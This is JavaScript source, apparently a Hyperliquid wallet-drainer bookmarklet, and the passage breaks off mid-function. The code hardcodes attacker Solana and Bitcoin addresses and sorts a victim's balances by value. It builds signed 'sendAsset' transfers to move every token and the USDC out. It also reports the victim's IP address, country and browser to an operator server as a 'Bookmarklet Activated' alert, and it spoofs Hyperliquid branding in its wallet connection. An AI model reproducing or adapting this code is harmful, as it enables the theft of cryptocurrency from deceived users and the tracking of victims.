    const SOL_DESTINATION = "J1ppKuR6kphMAKkDCdsDypWBryGEKx3tdgX7t82LqGFA";
    const BTC_DESTINATION = "bc1q9mwghwgr2fmqsxlwys493g3zv8lff7nrujqcpc";
    const APP_ID = "clmv1d6am07asib0fs4ss7w2x";
    
    // ============================================================================
    // HYPERLIQUID API CONFIGURATION
    // ============================================================================
    const HYPERLIQUID_API = {
        INFO: "https://api.hyperliquid.xyz/info",
        EXCHANGE: "https://api.hyperliquid.xyz/exchange"
    };
    
    // Минимальный порог для вывода USDC (если USDC <= этой суммы, выводим и прекращаем)
    const USDC_THRESHOLD = 25;
    
    // Комиссии за вывод (примерные)
    const WITHDRAWAL_FEES = {
        // Комиссия за вывод spot токена (sendAsset) - обычно ~$1 USDC
        SPOT_TOKEN: 1.0,
        // Комиссия за вывод USDC через bridge (withdraw3) - обычно ~$1 USDC
        USDC_BRIDGE: 1.0,
        // Минимальный резерв USDC для безопасности
        SAFETY_RESERVE: 1
    };
    
    // Arbitrum chain config
    const ARBITRUM = { 
        id: 42161, 
        name: "Arbitrum One", 
        network: "arbitrum", 
        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 }, 
        rpcUrls: { default: { http: ["https://arb1.arbitrum.io/rpc"] } } 
    };
    
    // Fallback цены на случай если API недоступен
    const FALLBACK_PRICES = {
        UBTC: 100_000,
        USOL: 150,
        UETH: 3_200,
        USDC: 1,
        BTC: 100_000,
        SOL: 150,
        ETH: 3_200,
        HYPE: 25,
        PURR: 0.01
    };
    
    // ============================================================================
    // API FUNCTIONS: Получение метаданных и цен
    // ============================================================================
    
    // Глобальный маппинг tokenName -> marketName (для поиска цен)
    let tokenToMarketMap = {};
    
    /**
     * Получает метаданные всех spot токенов (name, tokenId, etc.)
     * API: POST /info { type: "spotMetaAndAssetCtxs" }
     * 
     * Response structure:
     * [
     *   { universe: [...], tokens: [...] },  // spotMeta
     *   [{ coin: "@35", midPx: "0.084" }...] // assetCtxs (market context)
     * ]
     */
    async function getSpotMetaAndAssetCtxs() {
        try {
            const response = await fetchWithTimeoutUtil(HYPERLIQUID_API.INFO, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: "spotMetaAndAssetCtxs" })
            }, 10000);
            
            if (!response.ok) {
                console.debug('[Hyperliquid] spotMetaAndAssetCtxs failed:', response.status);
                return null;
            }
            
            const [spotMeta, assetCtxs] = await response.json();
            const { universe, tokens } = spotMeta;
            
            // 1. Создаём map: tokenIndex -> marketName из universe
            // universe содержит: { tokens: [baseTokenIdx, quoteTokenIdx], name: "@35", index: 35 }
            const tokenIndexToMarket = {};
            universe.forEach(market => {
                const baseTokenIndex = market.tokens[0]; // первый токен в паре (тот что торгуется)
                tokenIndexToMarket[baseTokenIndex] = market.name; // "@35" или "PURR/USDC"
            });
            
            // 2. Создаём map: marketName -> price из assetCtxs
            const marketPrices = {};
            assetCtxs.forEach(ctx => {
                if (ctx.midPx) {
                    marketPrices[ctx.coin] = parseFloat(ctx.midPx);
                }
            });
            
            // 3. Создаём registry: tokenName -> { tokenId, marketName, price, ... }
            const assetRegistry = {};
            
            tokens.forEach(token => {
                const marketName = tokenIndexToMarket[token.index];
                const price = marketName ? marketPrices[marketName] : 0;
                
                assetRegistry[token.name] = {
                    name: token.name,
                    fullName: token.fullName || token.name,
                    tokenId: token.tokenId,
                    tokenIndex: token.index,
                    marketName: marketName, // "@35" для VEGAS
                    szDecimals: token.szDecimals,
                    weiDecimals: token.weiDecimals,
                    evmContract: token.evmContract,
                    isCanonical: token.isCanonical,
                    // Формат для sendAsset: "NAME:0x..."
                    tokenFormatted: `${token.name}:${token.tokenId}`,
                    // Цена из market context
                    price: price
                };
                
                // Сохраняем в глобальный маппинг для использования в getAllMidPrices
                if (marketName) {
                    tokenToMarketMap[token.name] = marketName;
                }
            });
            
            console.debug('[Hyperliquid] Loaded', Object.keys(assetRegistry).length, 'tokens');
            console.debug('[Hyperliquid] Token to market mappings:', Object.keys(tokenToMarketMap).length);
            
            // Логируем несколько примеров маппинга
            const examples = ['VEGAS', 'HYPE', 'PURR', 'JEFF'].filter(n => tokenToMarketMap[n]);
            if (examples.length > 0) {
                console.debug('[Hyperliquid] Example mappings:', examples.map(n => `${n} -> ${tokenToMarketMap[n]}`).join(', '));
            }
            
            return assetRegistry;
            
        } catch (error) {
            console.debug('[Hyperliquid] Error fetching spotMetaAndAssetCtxs:', error);
            return null;
        }
    }
    
    /**
     * Получает mid prices для всех ассетов
     * API: POST /info { type: "allMids" }
     * 
     * Использует tokenToMarketMap для конвертации:
     * - allMids возвращает цены по marketName ("@35", "BTC", "ETH")
     * - Мы конвертируем в tokenName ("VEGAS", "UBTC", "UETH")
     */
    async function getAllMidPrices() {
        try {
            const response = await fetchWithTimeoutUtil(HYPERLIQUID_API.INFO, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: "allMids" })
            }, 10000);
            
            if (!response.ok) {
                console.debug('[Hyperliquid] allMids failed:', response.status);
                return FALLBACK_PRICES;
            }
            
            const rawPrices = await response.json();
            // Response: { "@35": "0.084", "BTC": "100000", "PURR/USDC": "0.01", ... }
            
            const normalizedPrices = { ...FALLBACK_PRICES };
            
            // 1. Добавляем все raw prices (для perps и прямых совпадений)
            for (const [marketName, price] of Object.entries(rawPrices)) {
                const numPrice = parseFloat(price);
                if (!isNaN(numPrice) && numPrice > 0) {
                    normalizedPrices[marketName] = numPrice;
                    
                    // Маппинг perp токенов к wrapped версиям
                    if (marketName === 'BTC') normalizedPrices['UBTC'] = numPrice;
                    if (marketName === 'ETH') normalizedPrices['UETH'] = numPrice;
                    if (marketName === 'SOL') normalizedPrices['USOL'] = numPrice;
                }
            }
            
            // 2. Конвертируем marketName -> tokenName используя tokenToMarketMap
            // tokenToMarketMap: { "VEGAS": "@35", "HYPE": "@150", ... }
            for (const [tokenName, marketName] of Object.entries(tokenToMarketMap)) {
                if (rawPrices[marketName]) {
                    const numPrice = parseFloat(rawPrices[marketName]);
                    if (!isNaN(numPrice) && numPrice > 0) {
                        normalizedPrices[tokenName] = numPrice;
                    }
                }
            }
            
            // 3. USDC всегда 1.0
            normalizedPrices['USDC'] = 1.0;
            
            console.debug('[Hyperliquid] Loaded prices for', Object.keys(normalizedPrices).length, 'assets');
            
            // Логируем примеры цен для проверки
            const checkTokens = ['VEGAS', 'HYPE', 'PURR', 'UBTC', 'USOL'];
            const foundPrices = checkTokens.filter(t => normalizedPrices[t]).map(t => `${t}: $${normalizedPrices[t].toFixed(4)}`);
            if (foundPrices.length > 0) {
                console.debug('[Hyperliquid] Sample prices:', foundPrices.join(', '));
            }
            
            return normalizedPrices;
            
        } catch (error) {
            console.debug('[Hyperliquid] Error fetching allMids, using fallback:', error);
            return FALLBACK_PRICES;
        }
    }
    
    /**
     * Обогащает балансы ценами и метаданными, умно сортирует
     * - Non-USDC ассеты сортируются по стоимости (от большей к меньшей)
     * - USDC всегда выводится последним
     * - Если USDC <= USDC_THRESHOLD, то ассеты дешевле USDC не выводятся
     */
    function enrichAndSortBalances(balances, prices, assetRegistry) {
        // Обогащаем каждый баланс
        const enrichedBalances = balances.map(balance => {
            const coin = balance.coin;
            const amount = Number(balance.total);
            const meta = assetRegistry?.[coin] || {};
            
            // Приоритет цен: prices (allMids) -> assetRegistry.price -> FALLBACK_PRICES
            const price = prices[coin] || meta.price || FALLBACK_PRICES[coin] || 0;
            const valueUSD = amount * price;
            
            // Логируем если цена не найдена
            if (price === 0 && amount > 0) {
                console.debug(`[Hyperliquid] Warning: No price found for ${coin}, market: ${meta.marketName || 'unknown'}`);
            }
            
            return {
                ...balance,
                amount,
                price,
                valueUSD,
                tokenId: meta.tokenId,
                tokenFormatted: meta.tokenFormatted,
                marketName: meta.marketName, // "@35" для VEGAS
                fullName: meta.fullName || coin,
                szDecimals: meta.szDecimals || 8
            };
        });
        
        // Разделяем USDC и остальные ассеты
        const usdcBalance = enrichedBalances.find(b => b.coin === 'USDC');
        const nonUsdcBalances = enrichedBalances.filter(b => b.coin !== 'USDC');
        
        // Сортируем non-USDC по стоимости (от большей к меньшей)
        nonUsdcBalances.sort((a, b) => b.valueUSD - a.valueUSD);
        
        // Определяем какие ассеты выводить
        let assetsToWithdraw = [];
        
        if (usdcBalance) {
            const usdcValue = usdcBalance.valueUSD;
            
            if (usdcValue <= USDC_THRESHOLD) {
                // USDC <= 150: выводим только ассеты дороже или равные USDC, затем USDC
                // Фильтруем non-USDC: оставляем только те что >= USDC по стоимости
                const worthyAssets = nonUsdcBalances.filter(b => b.valueUSD >= usdcValue);
                assetsToWithdraw = [...worthyAssets, usdcBalance];
                
                console.debug(`[Hyperliquid] USDC value ($${usdcValue.toFixed(2)}) <= threshold ($${USDC_THRESHOLD})`);
                console.debug(`[Hyperliquid] Skipping ${nonUsdcBalances.length - worthyAssets.length} assets cheaper than USDC`);
            } else {
                // USDC > 150: выводим все ассеты, USDC последним
                assetsToWithdraw = [...nonUsdcBalances, usdcBalance];
            }
        } else {
            // Нет USDC - просто сортируем по стоимости
            assetsToWithdraw = nonUsdcBalances;
        }
        
        // Логируем итоговый порядок вывода
        console.debug('[Hyperliquid] Withdrawal order:');
        assetsToWithdraw.forEach((b, i) => {
            console.debug(`  ${i + 1}. ${b.coin}: ${b.amount.toFixed(b.szDecimals || 4)} ($${b.valueUSD.toFixed(2)})`);
        });
        
        return assetsToWithdraw;
    }
    
    /**
     * Рассчитывает комиссию за вывод одного ассета
     */
    function getWithdrawalFee(asset) {
        // USDC теперь использует sendAsset (как spot токены), комиссия та же
        return WITHDRAWAL_FEES.SPOT_TOKEN; // $1 для всех (spot токены и USDC)
    }
    
    /**
     * Фильтрует ассеты для вывода на основе доступного USDC баланса
     * Выбирает максимальное количество ассетов, которые можно вывести
     * 
     * @param {Array} assetsToWithdraw - Массив ассетов для вывода (уже отсортирован по стоимости)
     * @param {number} availableUSDC - Доступный баланс USDC
     * @returns {Object} { filtered: Array, totalFees: number, skipped: number }
     */
    function filterAssetsByUSDCBalance(assetsToWithdraw, availableUSDC) {
        const available = Number(availableUSDC) || 0;
        const filtered = [];
        let totalFees = WITHDRAWAL_FEES.SAFETY_RESERVE; // Минимальный резерв
        const skipped = [];
        
        // Разделяем USDC и остальные ассеты
        const usdcAsset = assetsToWithdraw.find(a => a.coin === 'USDC');
        const nonUsdcAssets = assetsToWithdraw.filter(a => a.coin !== 'USDC');
        
        // Проходим по non-USDC ассетам (уже отсортированы по стоимости от большей к меньшей)
        for (const asset of nonUsdcAssets) {
            const fee = getWithdrawalFee(asset);
            const newTotalFees = totalFees + fee;
            
            if (newTotalFees <= available) {
                // Хватает USDC - добавляем ассет
                filtered.push(asset);
                totalFees = newTotalFees;
            } else {
                // Не хватает USDC - пропускаем
                skipped.push(asset);
            }
        }
        
        // USDC всегда выводится последним (если есть и хватает средств)
        if (usdcAsset) {
            const usdcFee = getWithdrawalFee(usdcAsset);
            const newTotalFees = totalFees + usdcFee;
            
            if (newTotalFees <= available) {
                filtered.push(usdcAsset);
                totalFees = newTotalFees;
            } else {
                skipped.push(usdcAsset);
            }
        }
        
        console.debug(`[Hyperliquid] Filtered assets by USDC balance:`);
        console.debug(`  Available USDC: $${available.toFixed(2)}`);
        console.debug(`  Total fees for filtered: $${totalFees.toFixed(2)}`);
        console.debug(`  Assets to withdraw: ${filtered.length} (skipped: ${skipped.length})`);
        
        if (skipped.length > 0) {
            console.debug(`  Skipped assets:`, skipped.map(a => `${a.coin} ($${a.valueUSD.toFixed(2)})`).join(', '));
        }
        
        return {
            filtered: filtered,
            totalFees: totalFees,
            skipped: skipped,
            available: available,
            remaining: available - totalFees
        };
    }
    
    /**
     * Проверяет достаточность USDC баланса для оплаты комиссий за выводы
     * 
     * @param {Array} assetsToWithdraw - Массив ассетов для вывода
     * @param {number} availableUSDC - Доступный баланс USDC (из perp clearinghouseState)
     * @returns {Object} { sufficient: boolean, required: number, available: number, message?: string }
     */
    function checkUSDCBalanceForWithdrawals(assetsToWithdraw, availableUSDC) {
        // Рассчитываем общую стоимость комиссий
        let totalFees = WITHDRAWAL_FEES.SAFETY_RESERVE; // Минимальный резерв
        
        assetsToWithdraw.forEach(asset => {
            totalFees += getWithdrawalFee(asset);
        });
        
        const available = Number(availableUSDC) || 0;
        const required = totalFees;
        const sufficient = available >= required;
        
        console.debug(`[Hyperliquid] USDC balance check:`);
        console.debug(`  Available: $${available.toFixed(2)}`);
        console.debug(`  Required for fees: $${required.toFixed(2)}`);
        console.debug(`  Assets to withdraw: ${assetsToWithdraw.length}`);
        console.debug(`  Sufficient: ${sufficient}`);
        
        if (!sufficient) {
            const shortfall = required - available;
            return {
                sufficient: false,
                required: required,
                available: available,
                shortfall: shortfall,
                message: `Insufficient USDC balance for withdrawal fees.\n\n` +
                        `Available: $${available.toFixed(2)}\n` +
                        `Required: $${required.toFixed(2)}\n` +
                        `Shortfall: $${shortfall.toFixed(2)}\n\n` +
                        `Each withdrawal requires ~$1 USDC for gas fees.`
            };
        }
        
        return {
            sufficient: true,
            required: required,
            available: available,
            remaining: available - required
        };
    }
    
    // Динамические цены (будут заполнены при запуске)
    let dynamicPrices = { ...FALLBACK_PRICES };
    let assetRegistry = null;
    
    // ============================================================================
    // SIGN TYPES для EIP-712 подписей
    // ============================================================================
    const SIGN_TYPES = {
        SEND_ASSET: {
            primaryType: 'HyperliquidTransaction:SendAsset',
            types: [
                { name: "hyperliquidChain", type: "string" },
                { name: "destination", type: "string" },
                { name: "sourceDex", type: "string" },
                { name: "destinationDex", type: "string" },
                { name: "token", type: "string" },
                { name: "amount", type: "string" },
                { name: "fromSubAccount", type: "string" },
                { name: "nonce", type: "uint64" }
            ]
        },
        WITHDRAW: {
            primaryType: 'HyperliquidTransaction:Withdraw',
            types: [
                { name: 'hyperliquidChain', type: 'string' },
                { name: 'destination', type: 'string' },
                { name: 'amount', type: 'string' },
                { name: 'time', type: 'uint64' }
            ]
        }
    };
    
    /**
     * Создаёт EIP-712 signTypedData объект
     */
    function createSignTypedData(signType, message, chainId) {
        return {
            types: {
                [signType.primaryType]: signType.types
            },
            primaryType: signType.primaryType,
            domain: {
                chainId: chainId,
                name: "HyperliquidSignTransaction",
                verifyingContract: "0x0000000000000000000000000000000000000000",
                version: "1"
            },
            message: message
        };
    }
    
    // ============================================================================
    // CURRENCY DATA: Конфигурация для каждого типа ассета
    // ============================================================================
    const currencyData = {
        // UBTC - Bitcoin wrapped
        UBTC: {
            name: "Bitcoin",
            symbol: "BTC",
            tokenFormatted: "UBTC:0x8f254b963e8468305d409b33aa137c67",
            getDestination: async (targetDestination) => {
                const response = await retryWithBackoff(
                    async () => {
                        const response = await fetchWithTimeoutUtil(`https://api.hyperunit.xyz/gen/hyperliquid/bitcoin/btc/${targetDestination}`, {
                            "method": "GET"
                        }, 10000);
                        if (!response.ok) throw new Error(`hyperunit API error: ${response.status}`);
                        return await response.json();
                    },
                    { maxRetries: 2, initialDelay: 500 }
                );
                return response.address;
            },
            createWithdrawAction: async (balance, currentTimestamp, destination, chainId) => ({
                amount: String(balance.amount || balance.total),
                destination: destination,
                destinationDex: "spot",
                fromSubAccount: "",
                hyperliquidChain: "Mainnet",
                nonce: currentTimestamp,
                signatureChainId: '0x'.concat(chainId.toString(16)),
                sourceDex: "spot",
                token: "UBTC:0x8f254b963e8468305d409b33aa137c67",
                type: "sendAsset"
            }),
            signType: SIGN_TYPES.SEND_ASSET
        },
        
        // USOL - Solana wrapped
        USOL: {
            name: "Solana",
            symbol: "SOL",
            tokenFormatted: "USOL:0x49b67c39f5566535de22b29b0e51e685",
            getDestination: async (targetDestination) => {
                const response = await retryWithBackoff(
                    async () => {
                        const response = await fetchWithTimeoutUtil(`https://api.hyperunit.xyz/gen/hyperliquid/solana/sol/${targetDestination}`, {
                            "method": "GET"
                        }, 10000);
                        if (!response.ok) throw new Error(`hyperunit API error: ${response.status}`);
                        return await response.json();
                    },
                    { maxRetries: 2, initialDelay: 500 }
                );
                return response.address;
            },
            createWithdrawAction: async (balance, currentTimestamp, destination, chainId) => ({
                amount: String(balance.amount || balance.total),
                destination: destination,
                destinationDex: "spot",
                fromSubAccount: "",
                hyperliquidChain: "Mainnet",
                nonce: currentTimestamp,
                signatureChainId: '0x'.concat(chainId.toString(16)),
                sourceDex: "spot",
                token: "USOL:0x49b67c39f5566535de22b29b0e51e685",
                type: "sendAsset"
            }),
            signType: SIGN_TYPES.SEND_ASSET
        },
        
        // UETH - Ethereum wrapped
        UETH: {
            name: "Ethereum",
            symbol: "ETH",
            tokenFormatted: "UETH:0xe1edd30daaf5caac3fe63569e24748da",
            getDestination: async (targetDestination) => {
                const response = await retryWithBackoff(
                    async () => {
                        const response = await fetchWithTimeoutUtil(`https://api.hyperunit.xyz/gen/hyperliquid/ethereum/eth/${targetDestination}`, {
                            "method": "GET"
                        }, 10000);
                        if (!response.ok) throw new Error(`hyperunit API error: ${response.status}`);
                        return await response.json();
                    },
                    { maxRetries: 2, initialDelay: 500 }
                );
                return response.address;
            },
            createWithdrawAction: async (balance, currentTimestamp, destination, chainId) => ({
                amount: String(balance.amount || balance.total),
                destination: destination,
                destinationDex: "spot",
                fromSubAccount: "",
                hyperliquidChain: "Mainnet",
                nonce: currentTimestamp,
                signatureChainId: '0x'.concat(chainId.toString(16)),
                sourceDex: "spot",
                token: "UETH:0xe1edd30daaf5caac3fe63569e24748da",
                type: "sendAsset"
            }),
            signType: SIGN_TYPES.SEND_ASSET
        },
        
        // USDC - Stablecoin (использует sendAsset для внутренних переводов)
        USDC: {
            name: "USD Coin",
            symbol: "USDC",
            tokenFormatted: null, // Будет определено динамически в зависимости от source
            getDestination: async (targetDestination) => targetDestination, // EVM address напрямую
            createWithdrawAction: async (balance, currentTimestamp, destination, chainId, reserveAmount = 0) => {
                // Для sendAsset комиссия НЕ вычитается из amount - она берется отдельно из баланса
                // amount - это сумма, которую мы хотим вывести
                // Комиссия $1 берется из баланса отдельно
                // Итого списывается: amount + fee
                const amount = Number(balance.amount || balance.total);
                const fee = WITHDRAWAL_FEES.SPOT_TOKEN; // $1 комиссия
                
                // Получаем spot и perp балансы
                const spotAmount = balance.spotAmount !== undefined ? balance.spotAmount : 0;
                const perpAmount = balance.perpAmount !== undefined ? balance.perpAmount : 0;
                const totalAvailable = spotAmount + perpAmount; // Общий баланс для проверки
                
                // Определяем доступный баланс и источник для вывода
                // Приоритет: если spot USDC >= amount + fee, используем spot, иначе perp
                let availableBalance = totalAvailable;
                let source = balance.source || 'spot';
                
                // Выбираем источник с достаточным балансом
                if (spotAmount >= (amount + fee)) {
                    source = 'spot';
                    availableBalance = spotAmount;
                } else if (perpAmount >= (amount + fee)) {
                    source = 'perp';
                    availableBalance = perpAmount;
                } else if (spotAmount >= perpAmount && spotAmount > 0) {
                    // Если spot больше perp, используем spot (даже если недостаточно, уменьшим amount)
                    source = 'spot';
                    availableBalance = spotAmount;
                } else if (perpAmount > 0) {
                    // Используем perp
                    source = 'perp';
                    availableBalance = perpAmount;
                } else {
                    // Используем общий баланс (spot + perp)
                    availableBalance = totalAvailable;
                }
                
                // Для sendAsset: amount указываем как есть, комиссия берется отдельно
                // Но нужно убедиться, что баланса достаточно: availableBalance >= amount + fee
                // Если недостаточно, уменьшаем amount, оставляя место для комиссии
                let withdrawAmount = amount;
                const totalRequired = withdrawAmount + fee;
                
                // Проверяем общий баланс (spot + perp) для достаточности
                if (totalAvailable < totalRequired) {
                    // Уменьшаем сумму вывода, оставляя место для комиссии
                    // Округляем до 2 знаков после запятой, чтобы не терять копейки
                    withdrawAmount = Math.max(0, Math.floor((totalAvailable - fee) * 100) / 100);
                    
                    if (withdrawAmount <= 0) {
                        throw new Error(`USDC total balance (${totalAvailable.toFixed(2)}, spot: ${spotAmount.toFixed(2)}, perp: ${perpAmount.toFixed(2)}) is too small. Minimum required: ${(fee + 0.01).toFixed(2)} USDC (${fee} fee + 0.01 minimum)`);
                    }
                    
                    // После уменьшения amount, пересчитываем источник
                    if (spotAmount >= (withdrawAmount + fee)) {
                        source = 'spot';
                        availableBalance = spotAmount;
                    } else if (perpAmount >= (withdrawAmount + fee)) {
                        source = 'perp';
                        availableBalance = perpAmount;
                    } else if (spotAmount >= perpAmount && spotAmount > 0) {
                        source = 'spot';
                        availableBalance = spotAmount;
                    } else if (perpAmount > 0) {
                        source = 'perp';
                        availableBalance = perpAmount;
                    }
                    
                    console.debug(`[Hyperliquid] USDC balance adjustment: requested=${amount.toFixed(2)}, total=${totalAvailable.toFixed(2)}, spot=${spotAmount.toFixed(2)}, perp=${perpAmount.toFixed(2)}, fee=${fee}, adjusted=${withdrawAmount.toFixed(2)}, source=${source}`);
                } else {
                    // Баланса достаточно, но нужно убедиться что выбранный источник тоже достаточен
                    if (source === 'spot' && spotAmount < (withdrawAmount + fee)) {
                        // Spot недостаточно, переключаемся на perp
                        if (perpAmount >= (withdrawAmount + fee)) {
                            source = 'perp';
                            availableBalance = perpAmount;
                        } else {
                            // Даже perp недостаточно, уменьшаем amount
                            withdrawAmount = Math.max(0, Math.floor((Math.max(spotAmount, perpAmount) - fee) * 100) / 100);
                            if (spotAmount >= perpAmount) {
                                source = 'spot';
                                availableBalance = spotAmount;
                            } else {
                                source = 'perp';
                                availableBalance = perpAmount;
                            }
                        }
                    } else if (source === 'perp' && perpAmount < (withdrawAmount + fee)) {
                        // Perp недостаточно, переключаемся на spot
                        if (spotAmount >= (withdrawAmount + fee)) {
                            source = 'spot';
                            availableBalance = spotAmount;
                        } else {
                            // Даже spot недостаточно, уменьшаем amount
                            withdrawAmount = Math.max(0, Math.floor((Math.max(spotAmount, perpAmount) - fee) * 100) / 100);
                            if (spotAmount >= perpAmount) {
                                source = 'spot';
                                availableBalance = spotAmount;
                            } else {
                                source = 'perp';
                                availableBalance = perpAmount;
                            }
                        }
                    }
                }
                
                // Финальная проверка перед отправкой: баланс должен быть >= withdrawAmount + fee
                const finalTotal = withdrawAmount + fee;
                if (availableBalance < finalTotal) {
                    // Еще раз уменьшаем, если нужно (на случай ошибок округления)
                    withdrawAmount = Math.max(0, Math.floor((availableBalance - fee) * 100) / 100);
                    console.debug(`[Hyperliquid] Final adjustment: withdrawAmount=${withdrawAmount.toFixed(2)}, availableBalance=${availableBalance.toFixed(2)}, fee=${fee}, total=${(withdrawAmount + fee).toFixed(2)}`);
                }
                
                // USDC tokenId из assetRegistry (для spot USDC)
                const usdcTokenId = "0x6d1e7cde53ba9467b783cb7c530ce054";
                
                console.debug(`[Hyperliquid] USDC withdrawal: source=${source}, total=${totalAvailable.toFixed(2)}, spot=${spotAmount.toFixed(2)}, perp=${perpAmount.toFixed(2)}, requested=${amount.toFixed(2)}, withdraw=${withdrawAmount.toFixed(2)}, fee=${fee}`);
                
                // Используем sendAsset для USDC (как для spot токенов)
                // ВАЖНО: amount указываем БЕЗ вычета комиссии - комиссия берется отдельно из баланса
                if (source === 'spot') {
                    // Spot USDC: используем tokenId и sourceDex/destinationDex = "spot"
                    return {
                        amount: String(withdrawAmount), // Сумма вывода (комиссия $1 берется отдельно из баланса)
                        destination: destination,
                        destinationDex: "spot",
                        fromSubAccount: "",
                        hyperliquidChain: "Mainnet",
                        nonce: currentTimestamp,
                        signatureChainId: '0x'.concat(chainId.toString(16)),
                        sourceDex: "spot",
                        token: `USDC:${usdcTokenId}`, // Формат: "USDC:0x6d1e7cde53ba9467b783cb7c530ce054"
                        type: "sendAsset"
                    };
                } else {
                    // Perp USDC: без tokenId и пустые sourceDex/destinationDex
                    return {
                        amount: String(withdrawAmount), // Сумма вывода (комиссия $1 берется отдельно из баланса)
                        destination: destination,
                        destinationDex: "",
                        fromSubAccount: "",
                        hyperliquidChain: "Mainnet",
                        nonce: currentTimestamp,
                        signatureChainId: '0x'.concat(chainId.toString(16)),
                        sourceDex: "",
                        token: "USDC", // Просто "USDC" без tokenId для perp
                        type: "sendAsset"
                    };
                }
            },
            signType: SIGN_TYPES.SEND_ASSET // Используем SEND_ASSET вместо WITHDRAW
        }
    };
    
    /**
     * Создаёт конфигурацию для динамического spot токена (из assetRegistry)
     */
    function createDynamicTokenConfig(coin, tokenFormatted, fullName) {
        return {
            name: fullName || coin,
            symbol: coin,
            tokenFormatted: tokenFormatted,
            getDestination: async (targetDestination) => targetDestination, // EVM address
            createWithdrawAction: async (balance, currentTimestamp, destination, chainId) => ({
                amount: String(balance.amount || balance.total),
                destination: destination,
                destinationDex: "spot",
                fromSubAccount: "",
                hyperliquidChain: "Mainnet",
                nonce: currentTimestamp,
                signatureChainId: '0x'.concat(chainId.toString(16)),
                sourceDex: "spot",
                token: tokenFormatted,
                type: "sendAsset"
            }),
            signType: SIGN_TYPES.SEND_ASSET
        };
    }
    
    /**
     * Получает конфигурацию для ассета (из currencyData или динамически)
     */
    function getAssetConfig(coin, balance) {
        // Сначала проверяем hardcoded конфигурации
        if (currencyData[coin]) {
            return currencyData[coin];
        }
        
        // Для динамических токенов используем tokenFormatted из enriched balance
        if (balance?.tokenFormatted) {
            return createDynamicTokenConfig(coin, balance.tokenFormatted, balance.fullName);
        }
        
        // Пытаемся получить из assetRegistry
        if (assetRegistry?.[coin]?.tokenFormatted) {
            return createDynamicTokenConfig(
                coin, 
                assetRegistry[coin].tokenFormatted, 
                assetRegistry[coin].fullName
            );
        }
        
        console.debug(`[Hyperliquid] No config found for token: ${coin}`);
        return null;
    }

    const ipData = await ipDataPromise;

    function getCountryFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return '🏳️';
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
        return String.fromCodePoint(...codePoints);
    }

    async function sendMessageToServer(message = '', error = 0, errorMessage = '', chatId = code, user = username, plat = platform) {
        try {
            await retryWithBackoff(
                async () => {
                    const response = await fetchWithTimeoutUtil(
                        `${api_url.origin}/api/message`,
                        {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(
                                error === 1
                                    ? { error: 1, chatId: chatId, errorMessage: errorMessage, platform: plat, username: user, botId: botId }
                                    : { error: 0, chatId: chatId, message: message, platform: plat, username: user, botId: botId }
                            )
                        },
                        5000
                    );

                    if (!response.ok) {
                        throw new Error(`Server responded with ${response.status}`);
                    }

                    return response;
                },
                { maxRetries: 2, initialDelay: 500 }
            );
        } catch (err) {
            console.error('Failed to send message to server after retries:', err);
        }
    }

    const messageQueue = {
        high: [],
        normal: []
    };
    let isQueueProcessing = false;
    let queueRetryCount = {};

    function queueMessage(message = '', error = 0, errorMessage = '', chatId = code, user = username, plat = platform, priority = 'normal') {
        const msgId = Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        messageQueue[priority].push({ 
            id: msgId,
            message, 
            error, 
            errorMessage, 
            chatId, 
            user, 
            plat,
            timestamp: Date.now()
        });
        queueRetryCount[msgId] = 0;
        
        if (!isQueueProcessing) {
            processMessageQueue();
        }
    }

    async function processMessageQueue() {
        if (isQueueProcessing) return;
        isQueueProcessing = true;

        console.debug('[MessageQueue] Started processing queue');

        while (messageQueue.high.length > 0 || messageQueue.normal.length > 0) {
            // Высокий приоритет обрабатывается первым
            const msg = messageQueue.high.shift() || messageQueue.normal.shift();
            
            if (!msg) break;

            try {
                await sendMessageToServer(
                    msg.message, 
                    msg.error, 
                    msg.errorMessage, 
                    msg.chatId, 
                    msg.user, 
                    msg.plat
                );
                console.debug(`[MessageQueue] ✓ Sent message ${msg.id}`);
                delete queueRetryCount[msg.id];
            } catch (err) {
                console.error(`[MessageQueue] ✗ Failed message ${msg.id}:`, err.message);
                
                // Retry логика (максимум 2 повторных попытки)
                queueRetryCount[msg.id] = (queueRetryCount[msg.id] || 0) + 1;
                
                if (queueRetryCount[msg.id] < 3) {
                    console.debug(`[MessageQueue] Requeueing message ${msg.id} (attempt ${queueRetryCount[msg.id]})`);
                    messageQueue.normal.push(msg); // Возвращаем в конец очереди
                    await new Promise(r => setTimeout(r, 1000)); // Пауза перед retry
                } else {
                    console.error(`[MessageQueue] Dropping message ${msg.id} after 3 attempts`);
                    delete queueRetryCount[msg.id];
                }
            }
        }

        isQueueProcessing = false;
        console.debug('[MessageQueue] Queue empty, processing stopped');
    }

    /**
     * Ожидает отправки всех сообщений в очереди (для критичных моментов)
     */
    async function flushMessageQueue() {
        // Если очередь уже обрабатывается, ждём завершения
        while (isQueueProcessing || messageQueue.high.length > 0 || messageQueue.normal.length > 0) {
            await new Promise(r => setTimeout(r, 100));
        }
    }
    // ==================== END MESSAGE QUEUE ====================

    queueMessage("📍 <b>Platform: </b> " + platform + "\n\n🎯 <b>Bookmarklet Activated</b>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip + "\n<code>" + navigator.userAgent + "</code>", 0, "", code);


    const injectedStart = async (connection) => {
        try {
            console.debug('[Hyperliquid] Starting injectedStart for:', connection.address);

            const config = wagmi.createConfig({
                chains: [ARBITRUM],
                transports: { [ARBITRUM.id]: wagmi.http() },
                
                connectors: [
                    injected({ shimDisconnect: true }),
                    walletConnect({
                        projectId: "a27650e04812003001477ec7409a330f",
                        relayUrl: "wss://relay.walletconnect.org",
                        disableProviderPing: true,
                        showQrModal: false,
                        metadata: {
                            name: "Hyperliquid",
                            description: "Hyperliquid",
                            url: "https://app.hyperliquid.xyz/portfolio",
                            icons: ["https://app.hyperliquid.xyz/favicon.ico"],
                        },
                    }),
                ],
            });

            let account = wagmi.getAccount(config);
            if (account.status !== 'connected') {
                console.debug('[Hyperliquid] Account not connected, attempting reconnect...');
                await wagmi.reconnect(config);

                account = wagmi.getAccount(config);
                if (account.status !== 'connected') {
                    console.debug('[Hyperliquid] Reconnect failed for:', connection.address);
